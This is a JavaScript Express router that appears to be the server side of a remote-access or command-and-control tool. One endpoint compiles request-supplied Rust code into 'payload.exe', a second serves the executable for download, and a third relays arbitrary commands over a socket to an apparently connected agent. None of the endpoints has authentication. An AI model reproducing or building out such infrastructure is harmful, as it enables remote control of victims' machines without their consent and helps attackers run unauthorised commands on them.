import { Router } from "express";
import fs from "fs";
import { exec } from "child_process"
import { URL, fileURLToPath } from 'url';
import { env } from "process";
import { agent, _socket } from "../app.js"

const router = Router();
const __dirname = new URL('./..', import.meta.url).pathname;
router.post("/generate", (req, res) => {
    // console.log(req.body.data)
    fs.writeFile('./payload/src/main.rs', req.body.data, function (err) {
        if (err) return console.log(err);
        exec(`cd "${fileURLToPath("file:\\" + __dirname + "payload")}" && cargo build`, (err) => {
            if (err) console.log(err)
            res.end("test")
        })
    });
})

router.get("/download", (req, res) => {
    res.sendFile(fileURLToPath("file:\\" + __dirname + "payload/target/debug/payload.exe"))
})

router.post("/command", (req, res) => {
    const command = req.body.command
    console.log(_socket)
    _socket.command = req.body.command
    if (_socket) {
        _socket.write(command)
    }
})

export default router;